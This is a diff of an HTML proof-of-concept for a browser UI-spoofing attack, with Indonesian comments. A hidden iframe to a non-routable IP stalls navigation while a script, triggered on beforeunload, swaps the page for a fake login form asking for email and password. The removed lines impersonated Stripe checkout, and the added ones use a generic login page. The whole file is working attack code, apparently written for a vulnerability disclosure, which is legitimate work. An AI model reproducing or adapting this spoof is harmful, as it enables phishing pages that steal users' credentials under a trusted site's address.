@@ -1,19 +1,24 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PoC 2 - Prolonged UI Spoof</title>
 </head>
 <body>
   <div id="content">
-    <h1>Waiting for navigation...</h1>
-    <p>Type <b>https://api.stripe.com</b> in the omnibox</p>
+    <h1>Step 2: Waiting for navigation...</h1>
+    <p>Ketik <b>https://10.255.255.1</b> di omnibox dan tekan Enter.</p>
   </div>
-
-  <!-- iframe sengaja stall -->
-  <iframe src="https://10.255.255.1" style="display:none"></iframe>
 
   <script>
     let triggered = false;
+
+    // Iframe untuk mensimulasikan loading lama
+    let iframe = document.createElement('iframe');
+    iframe.src = "https://10.255.255.1";  // Non-routable IP
+    iframe.style.display = "none";  // Tidak terlihat
+    document.body.appendChild(iframe);
 
     window.onbeforeunload = function () {
       triggered = true;
@@ -22,14 +27,14 @@
     setInterval(() => {
       if (triggered) {
         document.getElementById("content").innerHTML = `
-          <h1>Stripe Secure Checkout</h1>
-          <p>Your session has expired</p>
+          <h1>Example Login Page</h1>
+          <p>Session Anda telah berakhir, login untuk melanjutkan.</p>
           <input placeholder="Email"><br><br>
           <input type="password" placeholder="Password">
         `;
         triggered = false;
       }
-    }, 50);
+    }, 50);  // Update konten tiap 50ms
   </script>
 </body>
 </html>
